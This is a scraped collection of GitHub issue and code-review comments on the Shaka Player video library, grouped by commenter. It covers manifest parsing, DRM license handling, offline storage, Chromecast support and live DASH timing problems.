and platform code into their own classes. Did that make it easier for you to find where to make your changes?. Hello @pineapplejoe, thanks for the question!\nI know of two ways for you to achieve this behaviour:\n - Update the minBandwidth and maxBandwidth in the Abr config each time an adaptation event fires.\n - Create a custom Abr Manager. You could copy and modify our implementation shaka.media.SimpleAbrManager. This would allow you to dial-in your raising-bandwidth behaviour exactly as you need.\nDoes that help?. @odedhutzler, thanks for asking. To build off of what @TheModMaker said, we are still thinking through how a preload API will work.\nWith everything else going on (Shaka Embedded, Shaka UI, src=) we have not had time to scope-out what the requirements for pre-loading need to be. For example, we don't know if we only need to support pre-loading one piece of content or multiple pieces of content. @joeyparrish and I have casual conversations about the requirements, but have not sketched out what they will be yet.\nWhat I can tell you is that some foundational work is being done. The work for #816 is providing us with a framework to handle loading, the plan is to later extend it to provide the \"path\" for pre-loading. In 2.6, we are going to take-on some large refactorings, after that we should be in a better position to add more ambitious features.\nIt this answers your question, please feel free to close the issue and follow the conversations in #880.. @saibalaji10 I am sorry that your use-case does not naturally work with our model. Our parsers are meant to follow spec and it sounds like your situation may be out-of-spec.\nContent is not meant to go from static to live. Live content has a method of signaling the player when it should check for an update, static content does not have this.\nIn your use-case, where is the update signal (\"to do a single check to find the change\") coming from?. In your use-case, how will FFmpeg signal to the player(s) that it re-started the encoding process?. I will need more information before I can help. I don't understand how the each part of your project is working together. In your original post you said:\n\nwhen the client requests to increase the size\n\nThis makes it sound like the player and server have a 1-to-1 relationship and are talking with each other. Could you explain to me how the various parts of your project are communicating with each other and what they are saying to each other?. Thanks @saibalaji10, I think I have a better understanding, please tell me if this summary of the problem is accurate:\n\nIn this project, the server is hosting a live stream and can change the segment size mid-stream (as requested by the client). When the server terminates the FFMPEG process, FFMPEG changes the manifest from LIVE to VOD. When Shaka Player sees that the manifest is VOD, it stops checking for manifest updates, preventing it from resuming the stream once encoding resumes.. So @saibalaji10 there are a couple recommendations I can make,\n\n\nYou could change how you serve the MPD. Your web server could refuse the server the VOD copy of the asset and only server the LIVE copies. This would require a change to your web server code.\nYou could create a copy of our DASH Manifest parser, change it to treat all DASH manifest as LIVE manifests, and register it via our manifest parser plugin system (tutorial). \n\nEither way will require some effort on your part, but these would be the two options I could consider if I was in your shoes.\nDoes this help?. Thanks @chrisfillmore!. Hello @macoybarayan, it looks like our parser is failing to parse your content (therefore neither offline nor online playback will be possible).\nIt looks like we are failing at the sync byte while parsing the start time from https://s3-ap-southeast-1.amazonaws.com/vdyopublic/6109_593164a006664/800k-00000.ts, we are seeing 0x5F when we expect to see 0x47.\nHow did you generate your content?. Hello @macoybarayan, it looks like our parser is failing to parse your content (therefore neither offline nor online playback will be possible).\nIt looks like we are failing at the sync byte while parsing the start time from https://s3-ap-southeast-1.amazonaws.com/vdyopublic/6109_593164a006664/800k-00000.ts, we are seeing 0x5F when we expect to see 0x47.\nHow did you generate your content?. Thank you @skipness for filing this issue. Thank you @kevinscroggins-youi for helping out.\nI am putting together a change that will make the stall detector configurable via Player.configure. My hope is this will make these types of problems easier to work around and allow the community to experiment with different configurations, allowing us to find the ideal configuration for different platforms.\nThe three configurable attributes I am looking to expose are:\n\nEnabled : A flag for whether or not the player should initialize and use a stall detector.\nThreshold : The number of seconds that must pass without progress before firing the stall-event.\nSkip : The number of seconds to skip forward after a stall-event.\n\n@skipness, what do you think of this solution? Since we don't have a good way to reproduce TV issues, once the change has been submitted, I will likely rely on you to verify that it allows you to work around the issue on Tizen.. @adgllorente thank you for filing an issue with us. I am trying to reproduce your issue, but I am getting a 403 (forbidden) error when requesting the manifest. How can we access your manifest?. This issue is on my radar, there is a TODO in the handleError method in shaka.Player with all the information needed to fix the issue.\nBecause I know that reloading the page each time an error occurs can interrupt one's workflow, I can't image we would want this to issue to remain open for longer than necessary. Since I am out of the office until Monday, I would invite anyone interested in helping out to read the information in the TODO and resolve the issue.. This issue is on my radar, there is a TODO in the handleError method in shaka.Player with all the information needed to fix the issue.\nBecause I know that reloading the page each time an error occurs can interrupt one's workflow, I can't image we would want this to issue to remain open for longer than necessary. Since I am out of the office until Monday, I would invite anyone interested in helping out to read the information in the TODO and resolve the issue.. Is there a guarantee that there will be at least 3 elements in bytes?. Is there a guarantee that there will be an element with the given tag name?. Is there a guarantee that there will be a child node?. Could you reduce this down to:\nvar laurlNode = ...\nreturn (laurlNode ? laurlNode.childNodes[0].nodeValue : null) || '';. I would prefer it if we could avoid indexed array iteration. Can we do something like:\n```\nvar record = records.filter(function(record) {\n  return PLAYREADY_RECORD_TYPES[record.type] == 'RIGHTS_MANAGEMENT';\n}).pop();\nif (record) {\n  var xml = ...\n  return ...\n} else {\n  return ...\n}\n```. Here too, there are unchecked indexes. Can we add some checks to insure that the right amount of data is present before indexing?. To make it easier for us to add support for other schemes, could we structure this like:\n```\nvar license_url_parsers = {\n  'com.widevine.alpha': shaka.dash...\n  'com.microsoft.playready': shaka.dash...\n};\nvar license_parser = license_parsers[keySystem];\nif (license_parser) {\n  drmInfo.licenseServerUri = license_parser(element);\n}\n```. Since this function is to extract the init data from a segment, please do not have the network request as part of this function. Please just have it take in a segment and extract the init data from the segment.. Why does a function about extracting init data from segments return a manifest? Since the function is about extracting init data, please have it return something that reflects that, like an array of init data. If the function is about \"filling in\" drm info, please name the function as such and return nothing as it would modify a given manifest.\nIn either case, please add documentation to the function so that these nuances are clear.. Our coding standards have been updated that all variables that are only set once must be declared with \"const\". Please update your code to reflect that.. Our standards have been updated to avoid forEach unless necessary. Please update your code to use the for (const x of y) { ... } syntax.. Is there a reason why this is only needed to be done with stored content? Why would we never need to do this for streaming content?. Why are you moving something out of the polyfills? This can have dangerous side effects. If you just needed the share code, it would be safer to have the polyfill call the common code than to remove the polyfill.. Why make this optional? Why not always look at the moov?. Same comment as before, style guide violations. Please update the change to follow the style guide. If you run ./build/all.py it should (but not always) help point out violations.\nHowever a lot of these problems are on lines that you only changed the formatting of. Am I missing something?. Thanks for including this comment. It helps a lot.. What does it mean if the length is too small? Should this be an error?. We are moving away from using function. Please use an arrow-function instead.. Formatting does not follow the style guide. The \".set\" needs to be indented two tabs (four spaces). Then wrapped param needs to either be indented another two tabs (four spaces) or be inline with the original start of the parameters.. Thank you for aggressively using const.. For this case, could you just drop the else and have return ''; at the end of the function. While it is very minor, it is a bit more in-line with what we have done else where.. The logic in here needs some documentation. I still have no idea where \"2\" is coming from - and neither would someone else coming to this code in the future.. With a parse function, it is hard to know how it is suppose to work. Can you add an example of what the input/output would be in the doc string.\nThis method looks like it will crash if recordCount is not set correctly for recordData. How are recordCount and recordData associated? Why do we need both?. Am I viewing this wrong? Why are there still formatting changes for code you are not changing?. In our code base, the practice is to exit early to avoid heavily nesting code.\n```\nif (!laurlNodes || !laurlNodes.length) {\n  return '';\n}\nconst laurlNode = laurlNodes[0];\nif (!laurlNode.hasChildNodes()) {\n  return '';\n}\nconst laurl = laurlNode.childNodes[0].nodeValue;\nreturn laurl || '';\n``. Why do you only look at the first child? Can there be more than one child?. Do we need to differentiate from \"not found\" and \"it was actually an empty string\"?. Normally we tend to just use[0]since it won't require the list to remove an element (slightly less work). Indexing when the index does not exist is okay, it will just returnundefined.. This is another case where an early exit would be preferred.. Could you useMapinstead? We are trying to move away from usingObject` as a map.. Yup, I was viewing wrong. Thanks for reverting this part of the code.. Thank you, that helps a lot with understanding the structure.. I like this a lot more, thank you and good work.. Is a subarray required? \nIf head is less than recordData.length, it means that there will be a value athead`, so could this reduce to:\n```\nconst type  = recordData[head];\nconst byteLength = recordData[head + 1];\nconst wordLength = byteLength / 2;\nconst end = head + 2 + wordLength;\n...\nhead = end;\n``. Is the byte length required to be even, or else the division would fail, right? Could we add agoog.asserts.assertcall there so that we can be sure that we are parsing correctly?. Why isvaluea string? If we parsed it out as a Uint16 array, by encode it as a string? Would leaving it as an Uint16 array be easier?. While I like having the link for \"more\" information, the core information needs to be here too. The resource that the link points to can go away and then we lose the information we need.. NIT:!Uint16Array. NIT:!Uint16Array. Please update the tests to useconstoverlet` whenever possible.. ",
    "kvarro": "Hello, I have submitted a merge request which I believe will fix this issue. \nhttps://github.com/google/shaka-player/pull/721. ",
    "jorgitoml": "Hi! \nThanks for your reply,  but I'm talking about the sender side.\nThis dialog: \n\nAnd this overlay:\n\nWe don't know how to show the volume bar and the progress bar on the dialog...and we don't know what's the best way to detect the very first time that the user can cast using our web to show the overlay (using cookies may be? or if it is an API like in android)\nBest regards. \n. Thanks a lot.\nI've noticed that the requeriments have changed at January 31 and the dialog bars are not required anymore.\nhttps://developers.google.com/cast/docs/design_checklist/sender\nBest regards.. Great!\nTx TheModMaker!. I'm using this code to solve the previous problem: \nShakaControls.prototype.onCastStatusChange_ = function(event) {\n...\nvar aux_appData = shakaPlayer.appData;\n    if(aux_appData != null){\n                var isCasting = this.castProxy_.isCasting();\n        var player = this.castProxy_.getPlayer();\n        var video = this.castProxy_.getVideo();\n        if (isCasting){\n            player.unload().then(function() {\n                player.load(aux_appData.asset.manifestUriCC).then(function(){video.play();});\n            });\n        }else{\n            player.unload().then(function() {\n                player.load(aux_appData.asset.manifestUriLocal).then(function(){video.play();});\n            });\n        }\n    }\n};\nBut I'm getting this error when returning form chromecast to local:\n\nCould you tell me how to solve it?\nTx!\n. Ok, tx!. ",
    "zangue": "I started working on this lately and I would be happy to submit a PR once ready.. @pmcxs Sorry for the late reply. Essentially, manifest parsing is done, Init segment generation is almost done. What is left is patching MSS media segments to conform with the MSE, DRM support and writing tests (so, quite a bit actually). Work is currently on hold cause I have been lacking spare time lately but it looks like @olivas-bo is taking the lead on this issue anyway :)\nBtw @olivas-bo to address the second point of your question about a clean way to intercept and patch media segments before they are appended to the source buffer, I would suggest you use a ReponseFilter.. ",
    "pmcxs": "@zangue, what's the status of that PR?. ",
    "olivas-bo": "I started working on this as well. I have a question regarding the MSS fragments. AFAIK, the segments are not compatible with MSE, also, MSS does not have the concept of the init segment, so i will have to create a virtual init segment (similar to what hasplayer is doing) and transform the fetched segments. In order to do this is there a clean way to intercept the parsing of the segment before appending to the SourceBuffer?\nThanks in advance.. Thanks @joeyparrish i will follow your advise and try the data URI approach.. Thanks @zangue this was exactly what i was looking for.. @joeyparrish sorry i have been away for some days. Thank you for your info, i will keep an eye on #1339.\nRegarding your question about SmoothStreaming having an equivalent DASH's periods or HLS's discontinuities, the closest thing is called sparse tracks and it is used mainly to signal ads insertion. Does this answer your question?\n@subhranshudas i will not commit on a date for this sorry.... ",
    "subhranshudas": "I am actually new to the Streaming world, not sure if this is the right place to ask the question. I am looking to support MSS in shaka-player...from what i have read so far, this thread is trying to resolve that issue. May i know the ETA for MSS support on Shaka Player (how soon can we expect...). Also is there an official industry standard documentation to write the implementation for any DASH player for the MSS format. And also do we have any comparative analysis as to why shaka should be preferred over dash.js or vice versa. Thank you!!. @joeyparrish thank you for the reply. I actually meant \"Adaptive client player\". Thank you for clarifying shaka player team's current stance on MSS. I will definitely open a new issue for the comparison.\n@olivas-bo @zangue guys i am looking to start to implement MSS support for shaka player, can you please let me know a good place to start (from specs wise, i am new to the streaming world, still exploring). Would appreciate some sources.. @joeyparrish i understand that the best way forward is to wait for the working implementation of MSS. But am not sure how long the wait can go on...so i guess i will have to start some where for my project requirements. Probably start dash.js & hasPlayer as sources. \nIf other contributors can share their thoughts & progress it would help me in making the choice.. @olivas-bo thank you for the reply...will keep an eye for sure.... @TheModMaker Thanks for the extensive reply. \nBut I believe MSS is supported in dash.js https://github.com/Dash-Industry-Forum/dash.js/tree/development/src/mss\n. Thank you @joeyparrish @TheModMaker @epiclabsDASH @TobbeEdgeware @wilaw for the exhaustive list. This will serve as a reference point for beginners like me.. @epiclabsDASH regarding https://github.com/google/shaka-player/issues/1351#issuecomment-372849390 how does dash.js implement network filters (request/response)?\nThis is in reference to my question in https://github.com/Dash-Industry-Forum/dash.js/issues/2478#issuecomment-374995457 . ",
    "jlnabais": "Hello all,\nI've also  been working in this  along with @olivas-bo and we already got mss manifest, init segment generation and fragments apparently working (at least for the tested assets), at this point we can successfully playback widevine protected audio and video\nHowever, for some reason, we are having a Shaka Error MANIFEST.RESTRICTIONS_CANNOT_BE_MET () (does not interrupts playback) error thrown, seems that for some reason the variants are getting empty internally and the code throws at the player module when checking if (!variants || !variants.length), we've noticed that this code gets executed twice and at a first run the variants are correctly filled, but empty in a second run,  note that in the mss parser returned object they are correct. Following the call stack we get to processKeyStatusChanges_. However, so far, we are unable to understand the reason for variants to be empty at a certain point in time. @joeyparrish can you shed some light into this? \nMany Thanks.\n. @chrisfillmore Chrome Version 65.0.3325.181 (Official Build) (64-bit). Got it, variant.allowedByKeySystem was being defined as false, because we were wrongly setting KeyId when parsing from MSS manifest ProtectionHeader element. That would make the keyStatus to be false when running:\nvariant.allowedByKeySystem =  !!keyStatus && restrictedStatuses.indexOf(keyStatus) < 0;\nTherefore the variants would be empty. :). ",
    "filipepeixinho": "Pierpaolo1992, have you manage to play your video without supplying the key server url to shaka player like the code you show on top of this discussion?\nI also have a dash manifest with LA URL/key server url inside but is there any way to make shaka read this information from manifest instead of me providing it with configure function? Does anyone can show me a sample code if what I need is possible?\nI will be much appreciated.\n. ",
    "hariszukanovic": "I will try other browsers... a bit. I used so far only Chrome.\nI have tried to create a fix in the shaka packager, specifying in the dash manifest that the segment duration is longer when there are gaps in any of it's contained audio samples. But, the pts gaps still do exist in the audio elementary stream itself. \nIn Chrome, would that explain the fact that on player reload (stream restart) the player successfully starts perfectly synced audio/video but they slide apart after a short while as those gaps present in elementary audio stream accumulate?. @TheModMaker, does Chrome skip gaps at all?\nIn my case, using Chrome I can see desync very soon. \nUsing Firefox there seems to be no desync at all.. I do have a .ts recording of this live stream that I can convert to an on-demand version and could try that.\nThe .ts recording and the live transport stream as well are perfectly playable by itself in VLC for example. ",
    "BiasF": "sorry my mistake, found Typo in my html file .... ",
    "thwlaw": "Yes, exactly as you said.\nAlso, the header name is changed to all lower case.\n. ",
    "miyukki": "@TheModMaker Okay, I see.\nDoes shaka have the policy to prevent different stream types, or will it play if possible in the future?. @TheModMaker I understand. Thanks.. ",
    "fernandoneira": "Hey Jacob & Joey, thanks for your quick & insightful answers.\nI initially took the approach of writing the parser from scratch as you mention, but got a bit discouraged halfway given that some of the properties seemed non-trivial to obtain (the callback functions). So while we did rewrite chunks of the parser class, we rely on existing methods in other namespaces - such as the shaka.dash.SegmentTemplate.createStream method - to create the streams.\n(On a side note, this function relies on data passed being presented in XML, which would make sense to change into something more generic if it is intended to be used in custom parsers. I could think of a contribution if this makes sense to you as well).\nThe offline manifest parsing is definitely interesting. I may be able to replace some parts of our parser that could have something to do with the problem based on the offline implementation.\n. That did the trick @TheModMaker, thanks. I removed all references to the emsg boxes and will look into redoing the segments part based on that code.\nThat guide sounds like a really helpful tool, I'd be happy to help you with some input on our experience.\n. Excellent news! Thanks for your work @TheModMaker. I'll give this a full read in the coming weeks and rewrite our parser based on it, and let you know of any feedback/questions I come across.. \n. \n. ",
    "silverbucket": "For example. If we have pre-fetching logic built-in, based on the playlist, there could be some overhead in determining which instance made the request. There could be two instances of a player on a page, with the same playlist, which has seek'd to two different positions. . @TheModMaker could you point me to some more information on request/response filters and how that might be a solution? I couldn't find anything in the docs, but maybe I'm not looking for the right thing.. For future reference, I was able to determine the player that the request came from by adding a filter (while in the scope of the player instance) and attaching a custom header to the request which contains a ID value also attached to the player instance. Then creating a Singleton class which manages the registered players and routes to the correct players network request function based on the custom header of the incoming request.\n```javascript\n    player.getNetworkingEngine().registerRequestFilter((type, request) => {\n      request.headers[customHeaderName] = player.id;\n    });\n//... elsewhere in the code...\n\nfunction handleNetworkRequests(uri, params) {\n    //...\n    var id = params.headers[customHeaderName];\n    //...\n    var player = SomeSingletonManager.getPlayer(id);\n    player.networkRequest(uri, params);\n    //...\n}\n\n. I signed it!. Hi @ismena for what I'm working on at the moment, the code does not initialize the video itself, that's done by the end-user. So, when we access shaka player instance, we can make no assumptions made about what's on the HTML page, and which video element might have been assigned to the shaka player instance. We do, however, want to get video position information so that we have a better understand of the state of the video playback, using the standard HTML Media Element API. Does that make sense?. Sounds great! And in response to your question,  I need to be able to access the HTML Media  Element API in certain cases related to buffering, seeking etc. . @ismena thank you! any idea when the next patch release will be made so I can update the dependencies?. Thanks everyone! . ",
    "timpalander": "I forgot to clarify that it does work on my computer as well. It's only on the specified devices it doesn't work. The problem could however be what you describe so i will give that a try. Thank you!. Problem solved. I updated to Wowza 4.6.0.03 so i could enabled UTCTiming in the manifest. Everything is now working as expected. Thanks a bunch!. ",
    "alex-schwartzman": "Thanks, @joeyparrish .\nI could help you with the testing if you wish. :)\nBesides, one might find the generic remote control in the Google's Cast Sender SDK, which is already available for Chrome, Android, and iOS. Samples which use that SDK are available as well:\nhttps://github.com/googlecast/CastVideos-android\nhttps://github.com/googlecast/CastVideos-iOS\nhttps://github.com/googlecast/CastVideos-chrome\nI am a mobile developer, and being able to control playback using generic Cast SDK is very important for me because in order to comply with Cast UX Guidelines user should have a chance to control the playback even when the application is already terminated. As soon as the receiver is compatible with generic playback control messages, Android will do that for me, no need to keep the application alive.\nTherefore, when I build the Chromecast-enabled Android application with the custom receiver based Shaka player, it would help me a lot if it already supports generic playback control messages.\n. Just a small update: there are rumors that we don't need to emit those playback control messages by ourselves, but, instead, MediaManager will do that for us. That's a good news - we just need to implement cast.receiver.media.Player interface, and pass the implementation to the MediaManager's constructor.\nHere I have posted the working sample of the player implementation https://github.com/googlecast/CastReferencePlayer/issues/26. Thanks for stepping in to that challenge.\n@ismena there is a set of use-cases, which are expected to be handled when the application claims itself as Chromecast-compatible. They all boil down to Chromecast UX Guidelines :  https://developers.google.com/cast/docs/design_checklist/\nWhat is important for me as a developer, is that the receiver is capable of answering to the generic playback commands. When the answer contains all the information needed by the user - it's even better.\nWhat is important for me as a user - is that when I kick off playback of my favorite show using my mobile, I can see the tile of the show, it's title, and some controls in chrome://cast/#devices when I use chrome, or in Google Home application (available for Android and iOS : https://support.google.com/chromecast/answer/7071794?hl=en) when I use my tablet for playback control. When I say  \"playback control\" it means play, stop, skip to next, pause, adjust volume, kill cast session.\nAll those features described above are implemented already in MediaManager on the receiver side, and in Cast SDK v3 on the sender side. The only missing part in the puzzle is to let MediaManager know how pass playback control commands to Shaka. That's why it accepts \ncast.receiver.media.Player in it's constructor. (see https://developers.google.com/cast/docs/reference/receiver/cast.receiver.media.Player)\n. ",
    "ePirat": "There is really no special requirement for \"Icecast streams\". There is not even such a thing as an \"Icecast stream\" technically speaking, as it is just a normal, indefinite HTTP GET request receiving the audio/video data.\nIcecast does not support byte-ranges as that makes no sense for live content.\nGiven that Icecast just provides a single stream, no segments, there is no manifest.. ",
    "jakearchibald": "I have a longer post on streams here https://jakearchibald.com/2016/streams-ftw/.\nHere's a quick demo where a 3mb resource is fetched in a streaming manner. The response chunks are Uint8Arrays. http://jsbin.com/vuqasa/edit?js,console\nIs this what you're looking for?. ",
    "nampdn": "Thank you so much @joeyparrish, in my use case I don't implement a license server. I have my content encrypted using clearkey, just need a little bit secure in our country that people can't play downloaded file directly. Currently I hide the key with in my application.\nCan you guide me where to modify the source to allow the storing process of offline encrypted content?\nP/S: I have read the code but can't find where to apply it.. Awesome, I'll modify and test it then let you know how it goes.. @joeyparrish I have successfully modified the source in storage.js like what you have point and it can play the encrypted content without internet connection.\nYou saved our country!. hi @vaage, that's right, it is about the \"total size\" of content we are storing.\nAny update for this?. Thanks @vaage and @joeyparrish, your works are awesome!. Yes,\n1. On Chrome desktop: \n- Download 207MB of content then delete it takes 17.49 seconds.\n2. On Cordova with Crosswalk latest (on Chrome Android has a little bit faster): \n- Download the same file with 207MB, it takes 59.4 seconds.\nP/s: Sometimes in Cordova (with Crosswalk) delete bigger file would cause the app to crash, I don't know but I think it consumes a lot of memory to delete a file.\n. @joeyparrish Thanks, I know that cordova/crosswalk is not a main point for us.. @joeyparrish Once again your work is awesome!. @vaage I did the benchmark again and it takes about 10 seconds to remove 1GB content in Chrome Desktop. The performance in Cordova+Crosswalk also improved. Thanks and congrats!. ",
    "markbastiaans": "Thanks! Looking forward to a fix.\nA temporary workaround seems to be forcing the resolution in demo/receiver_app.js with a well-placed this.player_.setMaxHardwareResolution(3840, 2160);. I've confirmed this workaround with a small test.. ",
    "ebeffim": "We encounter the same issue. We've been using dashjs and hear good words about shaka. But this issue is blocking us from moving to shaka\nAttached is the very first mpd file fetched for our live stream. We would appreciate if you could point out what need to change for this manifest, in order for it to work.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<MPD xmlns=\"urn:mpeg:dash:schema:mpd:2011\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" profiles=\"urn:mpeg:dash:profile:isoff-live:2011\" type=\"dynamic\" availabilityStartTime=\"1970-01-01T00:00:00Z\" publishTime=\"2017-03-24T16:32:18Z\" timeShiftBufferDepth=\"PT50S\" minimumUpdatePeriod=\"PT10S\" maxSegmentDuration=\"PT10S\" minBufferTime=\"PT10S\">\n    <Period id=\"1\" start=\"PT0S\">\n    <AdaptationSet id=\"1\" group=\"1\" bitstreamSwitching=\"true\" segmentAlignment=\"true\" contentType=\"video\" mimeType=\"video/mp4\"  maxWidth=\"1280\" maxHeight=\"720\" par=\"16:9\" maxFrameRate=\"30\" startWithSAP=\"1\" maxPlayoutRate=\"30\">\n    <SegmentTemplate timescale=\"10000000\" media=\"S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels($Bandwidth$)/Fragments(video=$Time$)\" initialization=\"S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels($Bandwidth$)/Fragments(video=Init)\" presentationTimeOffset=\"14903730205310280\" >\n    <SegmentTimeline>\n    <S t=\"14903730805310280\" d=\"100000000\" r=\"4\"/>\n</SegmentTimeline>\n</SegmentTemplate>\n    <Representation id=\"video.1.L1\" bandwidth=\"1048576\" codecs=\"avc1.4d401e\" width=\"640\" height=\"360\" frameRate=\"30\" sar=\"1:1\"/>\n    <Representation id=\"video.1.L2\" bandwidth=\"1258291\" codecs=\"avc1.4d401f\" width=\"960\" height=\"540\" frameRate=\"30\" sar=\"1:1\"/>\n    <Representation id=\"video.1.L3\" bandwidth=\"1677721\" codecs=\"avc1.4d4028\" width=\"1280\" height=\"720\" frameRate=\"30\" sar=\"1:1\"/>\n</AdaptationSet>\n    <AdaptationSet id=\"2\" group=\"2\" bitstreamSwitching=\"true\" segmentAlignment=\"true\" contentType=\"audio\" mimeType=\"audio/mp4\" lang=\"und\">\n    <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\"/>\n    <SegmentTemplate timescale=\"48000\" media=\"S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels($Bandwidth$)/Fragments(audio_482_und=$Time$)\" initialization=\"S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels($Bandwidth$)/Fragments(audio_482_und=Init)\" presentationTimeOffset=\"71537904985489\" >\n    <SegmentTimeline>\n    <S t=\"71537907865745\" d=\"480256\" r=\"2\"/>\n    <S d=\"479232\"/>\n    <S d=\"480256\"/>\n</SegmentTimeline>\n</SegmentTemplate>\n    <Representation id=\"audio_482_und.2.L1\" bandwidth=\"64000\" codecs=\"mp4a.40.2\" audioSamplingRate=\"48000\"/>\n</AdaptationSet>\n</Period></MPD>\nDashjs would issue the following requests and start to play. The segment index numbers are simply derived from t= and d= in the SegmentTimeline \nRequest URL:http://172.29.3.205:5555/sdash/LIVE$channel1/10.mpd/S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels(1048576)/Fragments(video=Init)\nRequest URL:http://172.29.3.205:5555/sdash/LIVE$channel1/10.mpd/S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels(64000)/Fragments(audio_482_und=Init)\nRequest URL:http://172.29.3.205:5555/sdash/LIVE$channel1/10.mpd/S!d2EKREFTSF9VTkVOQxIKVP7...8Bnw__/QualityLevels(1048576)/Fragments(video=14903730905310280)\nshaka errors out with \"cannot find segment\" (see below). The manifst does not have UTCTiming tag but we added the following in our code, where manfiestUri is the uri of this particular manifest.\nplayer.configure({\n    manifest: {\n        dash: {\n            'clockSyncUri': manifestUri\n        }\n    }\n});\nWe would appreciate if you could point out what need to change for this manifest, in order for it to work.  \nThe debug log:\nmediakeys.js:52 Using native EME as-is.\nmediasource.js:49 Using native MSE as-is.\npromise.js:118 Using native Promises.\nvttcue.js:36 Using native VTTCue.\nplayer.js:557 No preferred audio language set.  We will choose an arbitrary language initially\n(anonymous) @ player.js:557\nplayerEval.js:143 The video has now been loaded!\nstreaming_engine.js:1128 (video:1) cannot find segment: currentPeriod.startTime=0 lookupTime=1490373094.6326666\nshaka.media.StreamingEngine.lookupSegmentPosition_ @ streaming_engine.js:1128\nshaka.media.StreamingEngine.getSegmentReferenceNeeded_ @ streaming_engine.js:1080\nshaka.media.StreamingEngine.update_ @ streaming_engine.js:969\nshaka.media.StreamingEngine.onUpdate_ @ streaming_engine.js:872\nstreaming_engine.js:1128 (audio:4) cannot find segment: currentPeriod.startTime=0 lookupTime=1490373094.6346667\nshaka.media.StreamingEngine.lookupSegmentPosition_ @ streaming_engine.js:1128\nshaka.media.StreamingEngine.getSegmentReferenceNeeded_ @ streaming_engine.js:1080\nshaka.media.StreamingEngine.update_ @ streaming_engine.js:969\nshaka.media.StreamingEngine.onUpdate_ @ streaming_engine.js:872\nstreaming_engine.js:1128 (video:1) cannot find segment: currentPeriod.startTime=0 lookupTime=1490373095.6346667\nshaka.media.StreamingEngine.lookupSegmentPosition_ @ streaming_engine.js:1128\nshaka.media.StreamingEngine.getSegmentReferenceNeeded_ @ streaming_engine.js:1080\nshaka.media.StreamingEngine.update_ @ streaming_engine.js:969\nshaka.media.StreamingEngine.onUpdate_ @ streaming_engine.js:872\nstreaming_engine.js:1128 (audio:4) cannot find segment: currentPeriod.startTime=0 lookupTime=1490373095.6366665\n. Thanks for detailing your analysis. It seems that the manifest I included in my report has the same \"time difference\" issue. And here is my analysis of that manifest.\nThe publishTime=\"2017-03-24T16:32:18Z\" (which is the same as the Date HTTP header) is 1490387538 sec and with availabilityStartTime=\"1970-01-01T00:00:00Z\", it means that the stream has been available for  1490387538 seconds. with timeShiftBufferDepth of 50 second, the range of timestamp expected is between 1490387488 to 1490387538 seconds.\nThe first segment in the video stream's SegmentTimeline is at media time 14903730805310280. Divide by timescale 10000000, and we get time 1490373080. Compare with expected starting time 1490387488, the difference is 1490387488 - 1490373080 = 14408 seconds which is about 4 hours difference.... ",
    "alexpokotilo": "Hi,\nI'm Nimble streamer team representative. I agree with your analysis.\nLet me explain why your have availability time problem here.\nWhen stream created we init availability stream time with current utc time. As provided manifest has timescale == 90000 this means source stream is mpegts. For mpegts streams time usually starts from arbitrary positive value. Moreover time may overrun and jump into the future from time to time and anyone who works with mpegts knows about that.\nI know IOP requirements and in case if your push rtmp/rtsp stream what start from 0 your will not see such issues. In ideal world availability time requirements meat and everything will work fine. But consider the case when time on the server was wrong during manifest build or source stream moved timestamp back.\nI don't want to say it's player issue but even DASH-IF already agreed there is something wrong with all these time processing in DASH. It looks like standard was made in assumption that there will not be any problems with time. But in anyway bitmovin and dash.js plays http://live1.karwan.tv/karwan.tv/vin-tv/manifest.mpd file.\nYou can easily check this here http://player.wmspanel.com/\nAgain I don't want to say shaka works not according to the spec. But if player sees segments in a  manifest even with wrong start time I think it should play them. IOP doesn't provide us with an answer how to handle stream sources with timestamps that periodically reset and jump into the future. I see such streams every day in practice. Hi,\nwe will arrange additional effort to follow IOP and DASH standard. Please consider to add additional robustness to the player as well. ",
    "danyentezari": "v2.1.0? I'll switch to Shaka Packager, then.\nFor your reference, here's the link to download the Bitmovin encoding output:\nhttps://we.tl/tqZyaCwPDB\nBest of luck!. @joeyparrish You are magnificent!\nI really needed this to work \ud83d\ude04 .. ",
    "PidginEnemy": "I'm waiting this feature too :). Hi there, i have the same issue. My HLS manifest not working in Shaka player (latest version).\nI tested this in demo application\n- select the \"custom asset\"\n- paste this https://media-ci.foxford.ru/dist/hls-issue/issue.master.m3u8 in \"Custom manifest\" field\nThis is my solution\nShaka player show error (MANIFEST.UNPLAYABLE_PERIOD, code 4011) - http://prntscr.com/fhgcua\nCan you explain why my manifest don't work with shaka player\nThanks,\nEvgeny. Ok, thanks for explanation. Now i use hls.js for my hls manifests.. ",
    "sergioavazquez": "Any news on this? I'm waiting for it too! . Great! I'll give it a try when you're done with it!. It's just to let you know what that variable is in my code. In the actual code that line's not commented.. The problem is not caused by Widevine. I tested it with a different dash stream, using widevine and it worked as expected. There could be something going on with those demo streams.... Thanks @TheModMaker! I was able to make it work importing the non compiled scripts. Apparently assets.js is not needed. I tried switching contents and it works without it. I'd really appreciate info on how to further integrate Chromecast. I'd love to be able to send custom messages with content's name, logo, etc.\nI got the player and video from the cast_proxy:\nconst video_ = castProxy_.getVideo();\n const player_ = castProxy_.getPlayer();\nThen I'm using that player's instance to load the asset and the video to play/pause. Is this what you were referring to?\n Is there a built in method for sending custom messages? if not, how can I integrate one with current's cast_proxy?\n. I'm referring to this part of the asset: \nlicenseServers: {\n      'com.widevine.alpha': https://yourServer.com/proxy?token=123456789&expires=1520531199,\n    }\nToken only has to be valid when starting reproduction, afterwards, even if it has expired it i'll keep working for as long as it's being continuously played. Token might be valid for just a minute, but once reproduction started you're good.\nIf later on I switch to Chromecast or back, I have no control over the asset. I can't update the token and once it tries to reproduce again, it fails because the token expired. \nOnce I get a LOAD_INTERRUPTED error, updating streams don't autoplay anymore. \nEven if I keep updating it. This means that after loading an asset video_.paused is true which according to Shaka's documentation is how we should evaluate whether a device has autoplay capabilities or not. \nThis is the error I get when the token expires, Is there a way to handle it?\nPOST 